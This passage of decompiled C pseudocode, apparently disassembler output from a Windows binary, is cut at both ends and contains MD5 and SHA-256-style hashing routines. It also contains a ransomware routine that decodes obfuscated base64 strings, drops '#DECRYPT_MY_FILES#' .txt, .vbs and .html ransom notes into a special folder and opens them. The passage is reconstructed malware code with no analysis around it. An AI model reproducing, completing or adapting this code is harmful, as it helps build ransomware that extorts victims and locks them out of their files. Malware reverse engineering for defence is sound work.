    v15 = v8 | v14[12] | 4;
    if ( *((_DWORD *)v14 + 14) )
      v15 = v8 | v14[12];
    sub_4043E0(&this[*(_DWORD *)(*(_DWORD *)this + 4)], v15, 0);
  }
  v23 = 4;
  if ( !(unsigned __int8)j____uncaught_exception(v8) )
    sub_40BEE0(this);
  LOBYTE(v23) = 5;
  v16 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
  if ( v16 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v16 + 8))(v16);
  return this;
}
// 41107F: variable 'v8' is possibly undefined
// 41398B: using guessed type int __fastcall j____uncaught_exception(_DWORD);

//----- (004110C0) --------------------------------------------------------
char __thiscall sub_4110C0(int this, int a2, char a3)
{
  struct lconv *v4; // esi
  const char *grouping; // esi
  unsigned int v6; // kr00_4
  unsigned int v7; // edi
  _BYTE *v8; // eax
  _BYTE *v9; // edx
  int v10; // ecx
  char v11; // al
  int v12; // edi
  const char *v13; // esi
  _BYTE *v14; // eax
  _BYTE *v15; // edx
  int v16; // ecx
  char v17; // al
  int v18; // edi
  const char *v19; // esi
  _BYTE *v20; // edx
  char result; // al
  struct lconv *v22; // ecx
  int v23; // [esp+0h] [ebp-54h] BYREF
  _Cvtvec v24; // [esp+10h] [ebp-44h] BYREF
  struct lconv *v25; // [esp+3Ch] [ebp-18h]
  int v26; // [esp+40h] [ebp-14h]
  int *v27; // [esp+44h] [ebp-10h]
  int v28; // [esp+50h] [ebp-4h]

  v27 = &v23;
  v26 = this;
  v4 = localeconv();
  v25 = v4;
  _Getcvt(&v24);
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  v28 = 0;
  if ( a3 )
    grouping = Locale;
  else
    grouping = v4->grouping;
  _Getcvt(&v24);
  v6 = strlen(grouping);
  v7 = v6 + 1;
  v8 = calloc(v6 + 1, 1u);
  v9 = v8;
  if ( !v8 )
    sub_415388();
  if ( v6 != -1 )
  {
    v10 = v8 - grouping;
    do
    {
      v11 = *grouping++;
      grouping[v10 - 1] = v11;
      --v7;
    }
    while ( v7 );
  }
  v12 = 6;
  *(_DWORD *)(this + 8) = v9;
  v13 = "false";
  v14 = calloc(6u, 1u);
  v15 = v14;
  if ( !v14 )
    sub_415388();
  v16 = v14 - "false";
  do
  {
    v17 = *v13++;
    v13[v16 - 1] = v17;
    --v12;
  }
  while ( v12 );
  v18 = 5;
  *(_DWORD *)(this + 16) = v15;
  v19 = "true";
  v20 = calloc(5u, 1u);
  if ( !v20 )
    sub_415388();
  do
  {
    result = *v19++;
    v19[v20 - "true" - 1] = result;
    --v18;
  }
  while ( v18 );
  *(_DWORD *)(this + 20) = v20;
  if ( a3 )
  {
    *(_WORD *)(this + 12) = 11310;
  }
  else
  {
    v22 = v25;
    *(_BYTE *)(this + 12) = *v25->decimal_point;
    result = *v22->thousands_sep;
    *(_BYTE *)(this + 13) = result;
  }
  return result;
}
// 4108F0: using guessed type int __thiscall unknown_libname_2(_DWORD);

//----- (00411259) --------------------------------------------------------
char *__thiscall sub_411259(char *this, char a2)
{
  return sub_40F470(&this[-*((_DWORD *)this - 1)], a2);
}

//----- (00411270) --------------------------------------------------------
int __cdecl sub_411270(int *a1, int a2, int a3)
{
  return sub_40CF80(a1, -1, a2, (int)a1, (int)&a3);
}

//----- (00411290) --------------------------------------------------------
_DWORD *__thiscall sub_411290(_DWORD *this, char *Src)
{
  char *v2; // eax
  unsigned int v4; // edx
  char *v5; // ecx
  char v6; // al
  unsigned int v7; // edx
  unsigned int v8; // eax
  char *v9; // edx
  int v10; // edi
  char *v11; // eax
  char v12; // cl
  char v14[8]; // [esp+4h] [ebp-Ch] BYREF

  v2 = Src;
  *(_BYTE *)this = 0;
  this[17] = 0;
  this[18] = 0;
  this[19] = 1732584193;
  this[20] = -271733879;
  this[21] = -1732584194;
  this[22] = 271733878;
  if ( *((_DWORD *)Src + 5) >= 0x10u )
    v2 = *(char **)Src;
  sub_411AD0(this, v2, *((_DWORD *)Src + 4));
  if ( !*(_BYTE *)this )
  {
    v4 = 0;
    v5 = (char *)this + 70;
    do
    {
      v6 = *(v5 - 2);
      v5 += 4;
      v14[v4] = v6;
      v14[v4 + 1] = *(v5 - 5);
      v14[v4 + 2] = *(v5 - 4);
      v14[v4 + 3] = *(v5 - 3);
      v4 += 4;
    }
    while ( v4 < 8 );
    v7 = (this[17] >> 3) & 0x3F;
    v8 = 120 - v7;
    if ( v7 < 0x38 )
      v8 = 56 - v7;
    sub_411AD0(this, asc_452188, v8);
    sub_411AD0(this, v14, 8u);
    v9 = (char *)this + 93;
    v10 = 4;
    v11 = (char *)this + 78;
    do
    {
      v12 = *(v11 - 2);
      v11 += 4;
      *(v9 - 1) = v12;
      v9 += 4;
      *(v9 - 4) = *(v11 - 5);
      *(v9 - 3) = *(v11 - 4);
      *(v9 - 2) = *(v11 - 3);
      --v10;
    }
    while ( v10 );
    memset((char *)this + 1, 0, 0x40u);
    *(_QWORD *)(this + 17) = 0i64;
    *(_BYTE *)this = 1;
  }
  return this;
}

//----- (004113C0) --------------------------------------------------------
int __thiscall sub_4113C0(_DWORD *this, int a2)
{
  int v2; // ebx
  unsigned __int8 *v3; // eax
  int *v4; // esi
  int v5; // edi
  int v6; // edx
  int v7; // ecx
  int v8; // edx
  int v9; // esi
  int v10; // edi
  int v11; // ebx
  int v12; // edx
  int v13; // esi
  int v14; // edi
  int v15; // ebx
  int v16; // edx
  int v17; // esi
  int v18; // edi
  int v19; // edx
  int v20; // edi
  int v21; // ebx
  int v22; // edi
  int v23; // esi
  int v24; // edx
  int v25; // ebx
  int v26; // edi
  int v27; // esi
  int v28; // edx
  int v29; // ebx
  int v30; // edi
  int v31; // esi
  int v32; // edx
  int v33; // ebx
  int v34; // edi
  int v35; // edx
  int v36; // esi
  int v37; // edi
  int v38; // ebx
  int v39; // edx
  int v40; // esi
  int v41; // edi
  int v42; // ebx
  int v43; // edx
  int v44; // esi
  int v45; // edi
  int v46; // ebx
  int v47; // edx
  int v48; // esi
  int v49; // eax
  int v50; // edi
  int v51; // edx
  int v52; // ecx
  int v53; // esi
  int v54; // edi
  int v55; // edx
  int v56; // ecx
  int v57; // esi
  int v58; // edi
  int v59; // edx
  int v60; // ecx
  int v61; // esi
  int v62; // edi
  int v63; // edx
  int v64; // ecx
  int v65; // ebx
  int v66; // edi
  int v67; // edx
  int v68; // esi
  int v69; // edx
  int v70; // ecx
  int result; // eax
  int v73; // [esp+10h] [ebp-58h]
  int v74; // [esp+14h] [ebp-54h]
  int v75; // [esp+14h] [ebp-54h]
  int v76; // [esp+18h] [ebp-50h]
  int v77; // [esp+18h] [ebp-50h]
  int v78; // [esp+1Ch] [ebp-4Ch]
  int v79; // [esp+1Ch] [ebp-4Ch]
  int v80; // [esp+20h] [ebp-48h]
  int v81; // [esp+20h] [ebp-48h]
  int v82; // [esp+20h] [ebp-48h]
  int v83; // [esp+24h] [ebp-44h] BYREF
  int v84; // [esp+28h] [ebp-40h]
  int v85; // [esp+2Ch] [ebp-3Ch]
  int v86; // [esp+30h] [ebp-38h]
  int v87; // [esp+34h] [ebp-34h]
  int v88; // [esp+38h] [ebp-30h]
  int v89; // [esp+3Ch] [ebp-2Ch]
  int v90; // [esp+40h] [ebp-28h]
  int v91; // [esp+44h] [ebp-24h]
  int v92; // [esp+48h] [ebp-20h]
  int v93; // [esp+4Ch] [ebp-1Ch]
  int v94; // [esp+50h] [ebp-18h]
  int v95; // [esp+54h] [ebp-14h]
  int v96; // [esp+58h] [ebp-10h]
  int v97; // [esp+5Ch] [ebp-Ch]
  int v98; // [esp+60h] [ebp-8h]

  v2 = this[20];
  v78 = this[22];
  v76 = this[21];
  v3 = (unsigned __int8 *)(a2 + 2);
  v73 = this[19];
  v4 = &v83;
  v5 = 16;
  do
  {
    v6 = v3[1];
    ++v4;
    v7 = *v3;
    v3 += 4;
    *(v4 - 1) = *(v3 - 6) | ((*(v3 - 5) | ((v7 | (v6 << 8)) << 8)) << 8);
    --v5;
  }
  while ( v5 );
  v8 = v2 + __ROL4__(v83 + (v2 & v76 | v78 & ~v2) + v73 - 680876936, 7);
  v9 = v8 + __ROL4__(v84 + (v8 & v2 | v76 & ~v8) + v78 - 389564586, 12);
  v10 = v9 + __ROR4__(v85 + (v8 & v9 | v2 & ~v9) + v76 + 606105819, 15);
  v11 = v10 + __ROR4__(v86 + (v10 & v9 | v8 & ~v10) + v2 - 1044525330, 10);
  v12 = v11 + __ROL4__(v87 + (v11 & v10 | v9 & ~v11) - 176418897 + v8, 7);
  v13 = v12 + __ROL4__(v88 + (v12 & v11 | v10 & ~v12) + 1200080426 + v9, 12);
  v14 = v13 + __ROR4__(v89 + (v12 & v13 | v11 & ~v13) - 1473231341 + v10, 15);
  v15 = v14 + __ROR4__(v90 + (v14 & v13 | v12 & ~v14) - 45705983 + v11, 10);
  v16 = v15 + __ROL4__(v91 + (v15 & v14 | v13 & ~v15) + 1770035416 + v12, 7);
  v17 = v16 + __ROL4__(v92 + (v16 & v15 | v14 & ~v16) - 1958414417 + v13, 12);
  v18 = __ROR4__(v93 + (v16 & v17 | v15 & ~v17) - 42063 + v14, 15);
  v77 = v17 + v18;
  v74 = v17 + v18 + __ROR4__(v94 + (v77 & v17 | v16 & ~v77) - 1990404162 + v15, 10);
  v19 = __ROL4__(v95 + (v74 & (v17 + v18) | v17 & ~v74) + 1804603682 + v16, 7);
  v79 = v74 + v19;
  v20 = __ROL4__(v96 + (v79 & v74 | (v17 + v18) & ~v79) + v17 - 40341101, 12);
  v80 = v74 + v19 + v20;
  v21 = v80 + __ROR4__(v97 + (v79 & (v79 + v20) | v74 & ~(v79 + v20)) + v77 - 1502002290, 15);
  v22 = v21 + __ROR4__(v98 + (v21 & v80 | (v74 + v19) & ~v21) + v74 + 1236535329, 10);
  v23 = v22 + __ROL4__(v74 + v19 - 165796510 + v84 + (v22 & v80 | v21 & ~v80), 5);
  v24 = v23 + __ROL4__(v80 - 1069501632 + v89 + (v23 & v21 | v22 & ~v21), 9);
  v25 = v24 + __ROL4__(v94 + (v22 & v24 | v23 & ~v22) + 643717713 + v21, 14);
  v26 = v25 + __ROR4__(v83 + (v23 & v25 | v24 & ~v23) - 373897302 + v22, 12);
  v27 = v26 + __ROL4__(v88 + (v26 & v24 | v25 & ~v24) - 701558691 + v23, 5);
  v28 = v27 + __ROL4__(v93 + (v27 & v25 | v26 & ~v25) + 38016083 + v24, 9);
  v29 = v28 + __ROL4__(v98 + (v26 & v28 | v27 & ~v26) - 660478335 + v25, 14);
  v30 = v29 + __ROR4__(v87 + (v27 & v29 | v28 & ~v27) - 405537848 + v26, 12);
  v31 = v30 + __ROL4__(v92 + (v30 & v28 | v29 & ~v28) + 568446438 + v27, 5);
  v32 = __ROL4__(v97 + (v31 & v29 | v30 & ~v29) - 1019803690 + v28, 9);
  v81 = v31 + v32;
  v33 = v31 + v32 + __ROL4__(v86 + (v30 & (v31 + v32) | v31 & ~v30) - 187363961 + v29, 14);
  v34 = __ROR4__(v91 + (v31 & v33 | (v31 + v32) & ~v31) + 1163531501 + v30, 12);
  v75 = v33 + v34;
  v35 = v33 + v34 + __ROL4__(v96 + ((v33 + v34) & v81 | v33 & ~v81) + v31 - 1444681467, 5);
  v36 = v35 + __ROL4__(v85 + (v35 & v33 | (v33 + v34) & ~v33) + v81 - 51403784, 9);
  v37 = v36 + __ROL4__(v90 + ((v33 + v34) & v36 | v35 & ~(v33 + v34)) + v33 + 1735328473, 14);
  v38 = v37 + __ROR4__(v95 + (v35 & v37 | v36 & ~v35) + v75 - 1926607734, 12);
  v39 = v38 + __ROL4__(v88 + (v38 ^ v37 ^ v36) - 378558 + v35, 4);
  v40 = v39 + __ROL4__(v91 + (v39 ^ v38 ^ v37) - 2022574463 + v36, 11);
  v41 = v40 + __ROL4__(v94 + (v39 ^ v38 ^ v40) + 1839030562 + v37, 16);
  v42 = v41 + __ROR4__(v97 + (v39 ^ v41 ^ v40) - 35309556 + v38, 9);
  v43 = v42 + __ROL4__(v84 + (v42 ^ v41 ^ v40) - 1530992060 + v39, 4);
  v44 = v43 + __ROL4__(v87 + (v43 ^ v42 ^ v41) + 1272893353 + v40, 11);
  v45 = v44 + __ROL4__(v90 + (v43 ^ v42 ^ v44) - 155497632 + v41, 16);
  v46 = v45 + __ROR4__(v93 + (v43 ^ v45 ^ v44) - 1094730640 + v42, 9);
  v47 = v46 + __ROL4__(v96 + (v46 ^ v45 ^ v44) + 681279174 + v43, 4);
  v48 = v47 + __ROL4__(v83 + (v47 ^ v46 ^ v45) - 358537222 + v44, 11);
  v49 = v47 - 640364487;
  v50 = v48 + __ROL4__(v86 + (v47 ^ v46 ^ v48) - 722521979 + v45, 16);
  v51 = v50 + __ROR4__(v46 + v89 + (v50 ^ v48 ^ v47) + 76029189, 9);
  v52 = v51 + __ROL4__(v49 + v92 + (v51 ^ v50 ^ v48), 4);
  v53 = v52 + __ROL4__(v95 + (v52 ^ v51 ^ v50) - 421815835 + v48, 11);
  v54 = v53 + __ROL4__(v98 + (v52 ^ v51 ^ v53) + 530742520 + v50, 16);
  v55 = v54 + __ROR4__(v85 + (v52 ^ v54 ^ v53) - 995338651 + v51, 9);
  v56 = v55 + __ROL4__(v83 + (v54 ^ (v55 | ~v53)) - 198630844 + v52, 6);
  v57 = v56 + __ROL4__(v90 + (v55 ^ (v56 | ~v54)) + 1126891415 + v53, 10);
  v58 = v57 + __ROL4__(v97 + (v56 ^ (v57 | ~v55)) - 1416354905 + v54, 15);
  v59 = v58 + __ROR4__(v88 + (v57 ^ (v58 | ~v56)) - 57434055 + v55, 11);
  v60 = v59 + __ROL4__(v95 + (v58 ^ (v59 | ~v57)) + 1700485571 + v56, 6);
  v61 = v60 + __ROL4__(v86 + (v59 ^ (v60 | ~v58)) - 1894986606 + v57, 10);
  v62 = v61 + __ROL4__(v93 + (v60 ^ (v61 | ~v59)) - 1051523 + v58, 15);
  v63 = v62 + __ROR4__(v84 + (v61 ^ (v62 | ~v60)) - 2054922799 + v59, 11);
  v64 = v63 + __ROL4__(v91 + (v62 ^ (v63 | ~v61)) + 1873313359 + v60, 6);
  v65 = v64 + __ROL4__(v98 + (v63 ^ (v64 | ~v62)) + v61 - 30611744, 10);
  v66 = v65 + __ROL4__(v89 + (v64 ^ (v65 | ~v63)) - 1560198380 + v62, 15);
  v67 = __ROR4__(v96 + (v65 ^ (v66 | ~v64)) + 1309151649 + v63, 11);
  v82 = v66 + v67;
  v68 = v66 + v67 + __ROL4__(v87 + (v66 ^ ((v66 + v67) | ~v65)) + v64 - 145523070, 6);
  v69 = v68 + __ROL4__(v94 + ((v66 + v67) ^ (v68 | ~v66)) + v65 - 1120210379, 10);
  v70 = v69 + __ROL4__(v85 + (v68 ^ (v69 | ~v82)) + v66 + 718787259, 15);
  this[19] = v68 + v73;
  this[21] += v70;
  result = v70 + this[20] + __ROR4__(v92 + (v69 ^ (v70 | ~v68)) + v82 - 343485551, 11);
  this[22] += v69;
  this[20] = result;
  return result;
}

//----- (00411AD0) --------------------------------------------------------
void *__thiscall sub_411AD0(_DWORD *this, char *Src, unsigned int a3)
{
  unsigned int v4; // ecx
  int v5; // esi
  unsigned int v6; // edx
  int v7; // edi
  unsigned int i; // esi

  v4 = a3;
  v5 = (this[17] >> 3) & 0x3F;
  v6 = this[17] + 8 * a3;
  this[17] = v6;
  if ( v6 < 8 * a3 )
    ++this[18];
  v7 = 64 - v5;
  this[18] += a3 >> 29;
  if ( a3 < 64 - v5 )
  {
    v7 = 0;
  }
  else
  {
    memmove_0((char *)this + v5 + 1, Src, 64 - v5);
    sub_4113C0(this, (int)this + 1);
    v4 = a3;
    for ( i = v7 + 64; i <= a3; v7 += 64 )
    {
      sub_4113C0(this, (int)&Src[i - 64]);
      v4 = a3;
      i += 64;
    }
    v5 = 0;
  }
  return memmove_0((char *)this + v5 + 1, &Src[v7], v4 - v7);
}

//----- (00411B80) --------------------------------------------------------
char **__thiscall sub_411B80(_BYTE *this, char **a2)
{
  char **v2; // ebx
  int v3; // esi
  int *v4; // edi
  char Src[36]; // [esp+Ch] [ebp-28h] BYREF

  v2 = a2;
  if ( *this )
  {
    v3 = 0;
    v4 = (int *)Src;
    do
    {
      sub_411270(v4, (int)"%02x", (unsigned __int8)this[v3++ + 92]);
      v4 = (int *)((char *)v4 + 2);
    }
    while ( v3 < 16 );
    v2 = a2;
    Src[32] = 0;
    a2[4] = 0;
    a2[5] = (char *)15;
    *(_BYTE *)a2 = 0;
    sub_401D10(a2, Src, strlen(Src));
  }
  else
  {
    a2[4] = 0;
    a2[5] = (char *)15;
    *(_BYTE *)a2 = 0;
    sub_401D10(a2, (void *)Locale, 0);
  }
  return v2;
}

//----- (00411C30) --------------------------------------------------------
void sub_411C30()
{
  void *v0; // ecx
  void *v1; // eax
  void *v2; // ecx
  void *v3; // eax
  void **v4; // edx
  _DWORD *v5; // ecx
  int v6; // eax
  void *v7; // edx
  _DWORD *v8; // ecx
  int v9; // eax
  FILE *v10; // esi
  void *v11; // ecx
  unsigned int v12; // eax
  void *v13; // ecx
  void *v14; // eax
  _DWORD *v15; // [esp-18h] [ebp-618h] BYREF
  int v16; // [esp-14h] [ebp-614h]
  int v17; // [esp-10h] [ebp-610h]
  int v18; // [esp-Ch] [ebp-60Ch]
  unsigned int v19; // [esp-8h] [ebp-608h]
  void *v20; // [esp-4h] [ebp-604h]
  void *v21[4]; // [esp+Ch] [ebp-5F4h] BYREF
  int v22; // [esp+1Ch] [ebp-5E4h]
  unsigned int v23; // [esp+20h] [ebp-5E0h]
  void *Block[4]; // [esp+24h] [ebp-5DCh] BYREF
  int v25; // [esp+34h] [ebp-5CCh]
  unsigned int v26; // [esp+38h] [ebp-5C8h]
  int v28[44]; // [esp+40h] [ebp-5C0h] BYREF
  int v29[44]; // [esp+F0h] [ebp-510h] BYREF
  void *v30[5]; // [esp+1A0h] [ebp-460h] BYREF
  unsigned int v31; // [esp+1B4h] [ebp-44Ch]
  void *v32; // [esp+1B8h] [ebp-448h] BYREF
  void *v33; // [esp+1C8h] [ebp-438h]
  unsigned int v34; // [esp+1CCh] [ebp-434h]
  CHAR v35[264]; // [esp+1D0h] [ebp-430h] BYREF
  CHAR FileName[264]; // [esp+2D8h] [ebp-328h] BYREF
  CHAR File[264]; // [esp+3E0h] [ebp-220h] BYREF
  CHAR pszPath[264]; // [esp+4E8h] [ebp-118h] BYREF
  int v39; // [esp+5FCh] [ebp-4h]

  v25 = 0;
  v26 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10(
    (char **)Block,
    "Y25ncBFuD20HcBF0A3EYSUlEBjwubiErcykrISNxMCovKzRwKi84KHMyITE/cTMtIDw+IDYrKmxZBCt0FTQ1MTo+M3A7ITs/czYtODQidiUsIis/NW46"
    "JTYjIXQiJTMzMHRNWmFjY2B+fWl5fHx7bm5jan1vY2Ngfn1peXx8e25uY2p9b2NjYH59aXl8fHtubmNkWnNgbgk8Jyo4PjAyYyIgI3ArID05MjwodCU5"
    "M2NhGigiYgw8IiQjISZzcTAxLCNnODY6Pj5pf2sjJiZ4Nyw8NyItJCsuJ34rJjZbXHFtbhUlLG4nOX1aTmd/cR8tYzovNWIaIT9zEjY7JiIzMW9uKCAn"
    "IG46NjI3PSU0bEljbmc4Njo+d3x/NyFiZSY0Kz4kMSQrJzcnJGo7Pzg5LUlEc35iCCEhPz8zdCU5M2MqIDQkMDstOTo/KidxPjhjNyYicDIvKShZc2l5"
    "fHx7bm5jan1vY2Ngfn1peXx8e25uY2p9b2NjYH59aXl8fHtubmNqfW9jY24=",
    0x20Cu);
  v39 = 0;
  sub_402080(&v15, (int *)Block);
  sub_4021A0(v15, v16, v17, v18, v19, (unsigned int)v20);
  LOBYTE(v39) = 2;
  if ( v26 >= 0x10 )
  {
    v0 = Block[0];
    if ( v26 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_46;
      v1 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v1 >= Block[0] || (unsigned int)(Block[0] - v1) < 4 || (unsigned int)(Block[0] - v1) > 0x23 )
        goto LABEL_46;
      v0 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v0);
  }
  v25 = 0;
  v26 = 15;
  LOBYTE(Block[0]) = 0;
  v22 = 0;
  v23 = 15;
  LOBYTE(v21[0]) = 0;
  sub_401D10(
    (char **)v21,
    "ECszcAFuc20QIiE1JTQZISkrJCRqbB0MAxlqByEHOSogK2V5SA1gHiM1JT9xcxc3NyspJCshIGxzETAgND8iKiwgZnJICCE/czlkaXFgdjcsbnNaAWAd"
    "PTYxL3RzCDk2MW4jPyE7Iyg9JDd4cSE+LDchNHxiKi85MjIlJzQidiItKmc/NiYrP3M5KSQ+IyIiLTpnNisiKz5zOCUiNHE0JiYgZzUsLTw0IyQhMHBzXA0mNjNa",
    0xF0u);
  LOBYTE(v39) = 3;
  sub_402080(&v15, (int *)v21);
  sub_4021A0(v15, v16, v17, v18, v19, (unsigned int)v20);
  LOBYTE(v39) = 5;
  if ( v23 >= 0x10 )
  {
    v2 = v21[0];
    if ( v23 + 1 >= 0x1000 )
    {
      if ( ((int)v21[0] & 0x1F) != 0 )
        goto LABEL_46;
      v3 = (void *)*((_DWORD *)v21[0] - 1);
      if ( v3 >= v21[0] || (unsigned int)(v21[0] - v3) < 4 || (unsigned int)(v21[0] - v3) > 0x23 )
        goto LABEL_46;
      v2 = (void *)*((_DWORD *)v21[0] - 1);
    }
    j__free(v2);
  }
  v22 = 0;
  v23 = 15;
  LOBYTE(v21[0]) = 0;
  memset(pszPath, 0, 0x104u);
  memset(v35, 0, 0x104u);
  memset(File, 0, 0x104u);
  SHGetSpecialFolderPathA(0, pszPath, 16, 0);
  SHGetSpecialFolderPathA(0, v35, 16, 0);
  SHGetSpecialFolderPathA(0, File, 16, 0);
  strcat_s(pszPath, 0x104u, "\\#DECRYPT_MY_FILES#.txt");
  strcat_s(File, 0x104u, "\\#DECRYPT_MY_FILES#.vbs");
  memset(v28, 0, sizeof(v28));
  sub_40B670(v28, pszPath, 2, v19, (int)v20);
  LOBYTE(v39) = 6;
  v4 = v30;
  v20 = v30[4];
  if ( v31 >= 0x10 )
    v4 = (void **)v30[0];
  sub_40C920((char *)v28, (int)v4, (unsigned int)v20);
  if ( !sub_40BAB0((int)&v28[1]) )
  {
    v20 = 0;
    v5 = (int *)((char *)v28 + *(_DWORD *)(v28[0] + 4));
    v6 = v5[3] | 6;
    if ( v5[14] )
      v6 = v5[3] | 2;
    sub_4043E0(v5, v6, (char)v20);
  }
  memset(v29, 0, sizeof(v29));
  sub_40B670(v29, File, 2, v19, (int)v20);
  LOBYTE(v39) = 7;
  v7 = &v32;
  v20 = v33;
  if ( v34 >= 0x10 )
    v7 = v32;
  sub_40C920((char *)v29, (int)v7, (unsigned int)v20);
  if ( !sub_40BAB0((int)&v29[1]) )
  {
    v20 = 0;
    v8 = (int *)((char *)v29 + *(_DWORD *)(v29[0] + 4));
    v9 = v8[3] | 6;
    if ( v8[14] )
      v9 = v8[3] | 2;
    sub_4043E0(v8, v9, (char)v20);
  }
  memset(FileName, 0, 0x104u);
  SHGetSpecialFolderPathA(0, FileName, 16, 0);
  strcat_s(FileName, 0x104u, "\\#DECRYPT_MY_FILES#.html");
  v10 = fopen(FileName, "wb");
  fwrite(aHtmlTitleSATUR_0, 1u, 0x3D7u, v10);
  fclose(v10);
  ShellExecuteA(0, "open", pszPath, 0, 0, 5);
  ShellExecuteA(0, "open", File, 0, 0, 5);
  ShellExecuteA(0, "open", FileName, 0, 0, 5);
  *(int *)((char *)v29 + *(_DWORD *)(v29[0] + 4)) = (int)&std::ofstream::`vftable';
  *(int *)((char *)&v28[43] + *(_DWORD *)(v29[0] + 4)) = *(_DWORD *)(v29[0] + 4) - 104;
  sub_40A7C0(&v29[1]);
  *(int *)((char *)v29 + *(_DWORD *)(v29[0] + 4)) = (int)&std::ostream::`vftable';
  *(int *)((char *)&v28[43] + *(_DWORD *)(v29[0] + 4)) = *(_DWORD *)(v29[0] + 4) - 8;
  LOBYTE(v39) = 8;
  v29[26] = (int)&std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v29[26]);
  *(int *)((char *)v28 + *(_DWORD *)(v28[0] + 4)) = (int)&std::ofstream::`vftable';
  *(int *)((char *)&v28[-1] + *(_DWORD *)(v28[0] + 4)) = *(_DWORD *)(v28[0] + 4) - 104;
  sub_40A7C0(&v28[1]);
  *(int *)((char *)v28 + *(_DWORD *)(v28[0] + 4)) = (int)&std::ostream::`vftable';
  *(int *)((char *)&v28[-1] + *(_DWORD *)(v28[0] + 4)) = *(_DWORD *)(v28[0] + 4) - 8;
  LOBYTE(v39) = 9;
  v28[26] = (int)&std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v28[26]);
  if ( v34 >= 0x10 )
  {
    v11 = v32;
    if ( v34 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)v32 & 0x1F) != 0 )
        goto LABEL_46;
      v12 = *((_DWORD *)v32 - 1);
      if ( v12 >= (unsigned int)v32 || (char *)v32 - v12 < (char *)4 || (char *)v32 - v12 > (char *)0x23 )
        goto LABEL_46;
      v11 = (void *)*((_DWORD *)v32 - 1);
    }
    j__free(v11);
  }
  v33 = 0;
  v34 = 15;
  LOBYTE(v32) = 0;
  if ( v31 < 0x10 )
    return;
  v13 = v30[0];
  if ( v31 + 1 >= 0x1000 )
  {
    if ( ((int)v30[0] & 0x1F) == 0 )
    {
      v14 = (void *)*((_DWORD *)v30[0] - 1);
      if ( v14 < v30[0] && (unsigned int)(v30[0] - v14) >= 4 && (unsigned int)(v30[0] - v14) <= 0x23 )
      {
        v13 = (void *)*((_DWORD *)v30[0] - 1);
        goto LABEL_44;
      }
    }
LABEL_46:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_44:
  j__free(v13);
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442330: using guessed type void *std::ofstream::`vftable';

//----- (00412200) --------------------------------------------------------
void __thiscall sub_412200(_DWORD *this, int a2, int a3)
{
  unsigned __int8 *v3; // eax
  int i; // esi
  int v5; // ecx
  int v6; // edx
  char *v7; // ebx
  int v8; // eax
  unsigned int v9; // edx
  int v10; // esi
  int v11; // ecx
  int v12; // eax
  int v13; // ebx
  int v14; // edi
  int v15; // edx
  int v16; // ebx
  _DWORD *v17; // ebx
  int v18; // ecx
  int v19[14]; // [esp+0h] [ebp-12Ch]
  char v20; // [esp+38h] [ebp-F4h] BYREF
  int v21; // [esp+100h] [ebp-2Ch]
  unsigned __int8 *v22; // [esp+104h] [ebp-28h]
  _DWORD *v23; // [esp+108h] [ebp-24h]
  int v24; // [esp+10Ch] [ebp-20h]
  int v25; // [esp+110h] [ebp-1Ch]
  int v26; // [esp+114h] [ebp-18h]
  unsigned int v27; // [esp+118h] [ebp-14h]
  int v28; // [esp+11Ch] [ebp-10h]
  int v29; // [esp+120h] [ebp-Ch]
  int v30; // [esp+124h] [ebp-8h]
  int v31; // [esp+128h] [ebp-4h]
  int v32; // [esp+134h] [ebp+8h]

  v23 = this;
  if ( a3 > 0 )
  {
    v3 = (unsigned __int8 *)(a2 + 2);
    do
    {
      for ( i = 0; i < 16; ++i )
      {
        v5 = v3[1];
        v6 = (*v3 | ((*(v3 - 1) | (*(v3 - 2) << 8)) << 8)) << 8;
        v3 += 4;
        v19[i] = v5 | v6;
      }
      v22 = v3;
      v7 = &v20;
      v8 = 48;
      do
      {
        v9 = *((_DWORD *)v7 - 13);
        v7 += 4;
        *((_DWORD *)v7 + 1) = *((_DWORD *)v7 - 6)
                            + *((_DWORD *)v7 - 15)
                            + ((*((_DWORD *)v7 - 1) >> 10) ^ __ROL4__(*((_DWORD *)v7 - 1), 13) ^ __ROL4__(
                                                                                                   *((_DWORD *)v7 - 1),
                                                                                                   15))
                            + ((v9 >> 3) ^ __ROR4__(v9, 7) ^ __ROL4__(v9, 14));
        --v8;
      }
      while ( v8 );
      v27 = 0;
      v10 = v23[34];
      v11 = v23[35];
      v21 = v10;
      v32 = v23[36];
      v26 = v23[37];
      v30 = v23[39];
      v29 = v23[40];
      v12 = v23[41];
      v28 = v11;
      v13 = v23[38];
      v24 = v12;
      v3 = v22;
      v31 = v10;
      v25 = v13;
      do
      {
        v14 = v24
            + v19[v27 / 4]
            + SHA512_Constants_4427B8[v27 / 4]
            + (v13 & v30 ^ v29 & ~v13)
            + (__ROR4__(v13, 6) ^ __ROL4__(v13, 7) ^ __ROR4__(v13, 11));
        v24 = v29;
        v10 = v14 + (v32 & v28 ^ v31 & (v32 ^ v28)) + (__ROR4__(v31, 2) ^ __ROL4__(v31, 10) ^ __ROR4__(v10, 13));
        v15 = v31;
        v29 = v30;
        v30 = v13;
        v16 = v26;
        v26 = v32;
        v13 = v14 + v16;
        v32 = v28;
        v28 = v31;
        v31 = v10;
        v27 += 4;
      }
      while ( (int)v27 < 256 );
      v25 = v13;
      v17 = v23;
      v23[34] = v10 + v21;
      v17[36] += v32;
      v17[37] += v26;
      v17[38] += v25;
      v17[39] += v30;
      v17[40] += v29;
      v18 = v24;
      v17[35] += v15;
      v17[41] += v18;
      --a3;
    }
    while ( a3 );
  }
}
// 4427B8: using guessed type int SHA512_Constants_4427B8[];
// 412200: using guessed type int var_12C[14];

//----- (00412400) --------------------------------------------------------
int __usercall sub_412400@<eax>(
        int a1@<ecx>,
        int a2@<ebp>,
        _DWORD *a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        unsigned int a8)
{
